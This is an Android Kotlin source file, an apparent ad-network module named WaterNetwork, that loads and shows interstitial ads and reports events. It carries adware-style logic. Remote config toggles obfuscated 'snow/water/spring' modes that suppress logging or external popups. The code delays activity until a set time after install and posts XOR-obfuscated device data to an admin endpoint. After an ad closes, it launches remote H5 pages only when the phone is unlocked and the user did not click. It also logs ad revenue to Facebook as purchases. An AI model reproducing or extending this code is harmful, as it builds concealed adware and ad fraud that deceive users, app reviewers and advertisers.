package com.water.soak

import android.app.Activity
import android.app.KeyguardManager
import android.content.Context
import android.os.PowerManager
import android.util.Base64
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustEvent
import com.facebook.appevents.AppEventsLogger
import com.tradplus.ads.base.bean.TPAdError
import com.tradplus.ads.base.bean.TPAdInfo
import com.tradplus.ads.open.interstitial.InterstitialAdListener
import com.tradplus.ads.open.interstitial.TPInterstitial
import com.water.soak.base.BaseSoakNetwork
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.util.Currency
import kotlin.random.Random

/**
 * Date：2024/8/13
 * Describe:
 */
class WaterNetwork : BaseSoakNetwork(), InterstitialAdListener {
    private var isClickAd = false
    lateinit var context: Context
    var mChange: ConfigureChange? = null
    private var lastAdSaveTime = 0L
    private var isLoading = false
    private var lastRequestTime = 0L
    private var mTPInterstitial: TPInterstitial? = null
    private var mTPInterstitial2: TPInterstitial? = null
    private val second = 1000L
    var timeCheck = 40 * second
    var timeWait = 460 * second
    private var timePeriod = 50 * second

    var isNeedCheckConfigure = true

    //不上报日志(snow) 方案B和不外弹(water) 方案A(spring)
    private var status = ""
    private var fileName = ""

    // H5 相关
    var stringH5Url = ""
    var stringNameH5 = "" // pkg name
    var h5TimeNow = 0
    var hourMaxH5 = 0
    var dayMaxH5 = 0


    // 广告id
    private var idSnow = ""
    private var idSnow2 = ""

    private val mJsonCommonImpl by lazy { JsonCommonImpl(context.packageName) }

    private var lastTime = 0L
    fun postAdmin() {
        if (System.currentTimeMillis() - lastTime in 0 until 1000 * 60) return
        lastTime = System.currentTimeMillis()
        val time = "${System.currentTimeMillis()}"
        val length = time.length
        val body = mJsonCommonImpl.getAdminBodyJson().toString()
        val bodyEncoder = body.mapIndexed { index, c ->
            (c.code xor time[index % length].code).toChar()
        }.joinToString("")
        val request = TideHelper.toRequestInfo(
            Base64.encodeToString(bodyEncoder.toByteArray(), Base64.DEFAULT),
            mJsonCommonImpl.urlA,
            map = mapOf("datetime" to time)
        )
        postNet(request, 4, failed = {
            if (TideHelper.mCacheImpl.mConfigure.isBlank()) {
                refreshAdmin()
            }
        }, success = {
            lastTime = System.currentTimeMillis()
        }, firstFailed = {

        }, str = "admin")
    }

    fun firstRefresh() {
        if (TideHelper.mCacheImpl.mConfigure.isNotBlank()) {
            mScopeIO.launch {
                delay(1000)
                runCatching {
                    ref(JSONObject(TideHelper.mCacheImpl.mConfigure))
                }
                delay(Random.nextLong(1000, 8 * 60000))
                TideHelper.requestAdmin()
            }
        } else {
            TideHelper.requestAdmin()
        }
    }

    fun isTimeWait(): Boolean {
        return System.currentTimeMillis() - TideHelper.mCacheImpl.mInstallTime in 0 until timeWait
    }

    private fun ref(jsonObject: JSONObject): String {
        jsonObject.apply {
            val s = optString("info_cache")
            if (s.contains("water") && status.contains("spring")) {
                return "failed"
            }
            status = s
            idSnow = optString("snow_id")
            idSnow2 = optString("spring_id")
            fileName = optString("ice_n")
            SteamHelper.urlApp = optString("snow_address")
            stringH5Url = optString("snow_ice_url")
            stringNameH5 = optString("snow_pkg_name")
            h5TimeNow = optInt("time_snow_ice", 0) * 1000
            refreshH5Limit(optString("snow_wv_limit"))

            refreshDelTime(optString("snow_time_del"))
            refreshLimit(optString("ice_steam_num", "10-20-9"))
            val listStr = optString("ice_time", "")
            if (listStr.isNotBlank() && listStr.contains("S")) {
                val lis = listStr.split("S")
                timeCheck = lis[0].toInt() * second
                timePeriod = lis[1].toInt() * second
                timeWait = lis[2].toInt() * second
            }
        }
        mChange?.changeBean(status, timePeriod, fileName)
        return "success"
    }

    private fun refreshLimit(string: String) {
        runCatching {
            TideHelper.mCacheImpl.refreshTime(string)
        }
    }

    private fun refreshDelTime(string: String) {
        runCatching {
            if (string.contains("-")) {
                val list = string.split("-")
                TideHelper.delayTimeStart = list[0].toLong()
                TideHelper.delayTimeEnd = list[1].toLong()
            }
        }
    }

    private fun refreshH5Limit(string: String) {
        runCatching {
            if (string.contains("-")) {
                val list = string.split("-")
                hourMaxH5 = list[0].toInt()
                dayMaxH5 = list[1].toInt()
            }
        }
    }

    override fun refreshData(string: String): String {
        val s = super.refreshData(string)
        runCatching {
            val sStatus = ref(JSONObject(s))
            if (status.contains("water")) {// B 方案
                refreshAdmin()
            }
            if (sStatus != "failed" || TideHelper.mCacheImpl.mConfigure.isBlank()) {
                TideHelper.mCacheImpl.mConfigure = s
            }
        }
        return ""
    }

    private var num = 9
    private fun refreshAdmin() {
        if (num <= 0) return
        if (System.currentTimeMillis() - TideHelper.mCacheImpl.mInstallTime > 60000 * 10) return
        mScopeIO.launch {
            delay(59000)
            postAdmin()
        }
    }

    fun postList(list: List<String>) {
        if (list.size == 1) {
            postEvent(list[0])
            return
        }
        if (status.contains("snow")) {
            TideHelper.log("cancel post event $list")
            return
        }
        TideHelper.log("post event $list")
        val jsArray = JSONArray()
        list.forEach {
            jsArray.put(getEventJs(it))
        }
        val request = TideHelper.toRequestInfo(jsArray, mJsonCommonImpl.urlPost)
        postNet(request, 0)
    }

    fun postEvent(name: String, pair: Pair<String, String>? = null) {
        val num = getPostNum(name)
        if (status.contains("snow") && num == 0) {
            TideHelper.log("cancel post event $name ")
            return
        }
        TideHelper.log("post event $name $pair")
        val js = getEventJs(name, pair)
        val request = TideHelper.toRequestInfo(js, mJsonCommonImpl.urlPost)
        postNet(request, num)
    }

    private fun getEventJs(name: String, pair: Pair<String, String>? = null): JSONObject {
        val js = mJsonCommonImpl.getCommonJson().apply {
            put("nosebag", name)
            pair?.let {
                put("${it.first}@locutor", it.second)
            }
        }
        return js
    }

    private var closeInvoke: (() -> Unit)? = null

    fun showAd(activity: Activity): Boolean {
        val ad = getReadyAd() ?: return false
        isClickAd = false
        closeInvoke = {
            jumpH5()
            activity.finishAndRemoveTask()
        }
        ad.showAd(activity, "")
        return true
    }

    private fun jumpH5() {
        if (isClickAd) return
        if (TideHelper.h5Status == 99) return
        if (isDeviceUnLocked(context).not()) return
        if (TideHelper.isH5Allow().not()) return
        mScopeIO.launch {
            TideHelper.showH5Event()
        }
    }

    private fun isDeviceUnLocked(context: Context): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

    private fun postAdEvent(tpAdInfo: TPAdInfo) {
        postAdEvent(tpAdInfo, mJsonCommonImpl.getCommonJson(), mJsonCommonImpl.urlPost)
    }

    fun loadAd() {
        if (TideHelper.isInitAdSuccess.not()) return
        val str = load()
        TideHelper.log("loadAd-->$str")
    }

    private fun load(): String {
        if (idSnow.isBlank() && idSnow2.isBlank()) {
            return "ad id is null"
        }
        if (isLoading && System.currentTimeMillis() - lastRequestTime < 60000) {
            return "ad is loading"
        }
        if (TideHelper.mCacheImpl.isLimitShowOrLoad()) {
            return "limit--->"
        }
        if (isReady()) {
            return "ad is ready"
        }
        isLoading = true
        lastRequestTime = System.currentTimeMillis()
        lastAdSaveTime = System.currentTimeMillis()

        if (mTPInterstitial == null && idSnow.isNotBlank()) {
            mTPInterstitial = TPInterstitial(context, idSnow)
        }
        if (mTPInterstitial2 == null && idSnow2.isNotBlank()) {
            mTPInterstitial2 = TPInterstitial(context, idSnow2)
        }

        if (isReadyAd().not()) {
            mTPInterstitial?.let {
                it.loadAd()
                it.setAdListener(this)
                postEvent("reqprogress")

            }
        }

        if (isReadyAd2().not()) {
            mTPInterstitial2?.let {
                it.loadAd()
                it.setAdListener(this)
                postEvent("reqprogress")

            }
        }
        return "ad load"
    }

    fun isReady(): Boolean {
        return isReadyAd() || isReadyAd2()
    }

    private fun getReadyAd(): TPInterstitial? {
        if (isReadyAd()) {
            return mTPInterstitial
        }
        if (isReadyAd2()) {
            return mTPInterstitial2
        }
        return null
    }

    private fun isReadyAd(): Boolean {
        val ad = mTPInterstitial ?: return false
        return ad.isReady
    }

    private fun isReadyAd2(): Boolean {
        val ad = mTPInterstitial2 ?: return false
        return ad.isReady
    }

    override fun onAdLoaded(p0: TPAdInfo?) {
        postEvent("getprogress")
        isLoading = false
        lastAdSaveTime = System.currentTimeMillis()
        job?.cancel()
        mChange?.loadAdSuccess()
    }

    private var job: Job? = null
    override fun onAdFailed(p0: TPAdError?) {
        postEvent("showfailer", Pair("string", "error_${p0?.errorCode}_${p0?.errorMsg}"))
        job?.cancel()
        job = mScopeIO.launch {
            delay(16000)
            isLoading = false
            load()
        }
    }

    override fun onAdImpression(p0: TPAdInfo?) {
        postEvent("showsuccess")
        TideHelper.mCacheImpl.addNum(false)
        showSuccessAd()
        p0?.let {
            postAdEvent(it)
            runCatching {
                AppEventsLogger.newLogger(context).logPurchase(
                    (it.ecpm.toDouble() / 1000).toBigDecimal(), Currency.getInstance("USD")
                )
            }
        }
    }

    override fun onAdClicked(p0: TPAdInfo?) {
        isClickAd = true
        TideHelper.mCacheImpl.addNum(true)
    }

    override fun onAdClosed(p0: TPAdInfo?) {
        closeInvoke?.invoke()
        closeInvoke = null
    }

    override fun onAdVideoError(p0: TPAdInfo?, p1: TPAdError?) {
        closeInvoke?.invoke()
        closeInvoke = null
    }

    override fun onAdVideoStart(p0: TPAdInfo?) = Unit

    override fun onAdVideoEnd(p0: TPAdInfo?) = Unit

    private var dayIndex by LakeIntImpl(-1)
    private var numShow by LakeIntImpl(0)
    private var num24 = 1000 * 60 * 60 * 24
    private val mapName = hashMapOf(
        10 to "lbv4w0", 20 to "xx0cte", 30 to "fv2aez", 40 to "zbp5qs", 50 to "hwtftw"
    )

    private fun showSuccessAd() {
        val dayNum = (System.currentTimeMillis() - TideHelper.mCacheImpl.mInstallTime) / num24
        TideHelper.log("showSuccessAd--->$dayNum ---$numShow")
        if (dayNum > dayIndex) {
            dayIndex = num24
            numShow = 1
        } else {
            numShow++
        }
        val name = mapName[numShow] ?: ""
        if (name.isNotBlank()) {
            TideHelper.log("trackEvent--->$name")
            setAdjust(name)
        }
    }


    private fun setAdjust(name: String) {
        val adjust = AdjustEvent(name)
        Adjust.trackEvent(adjust)
    }

}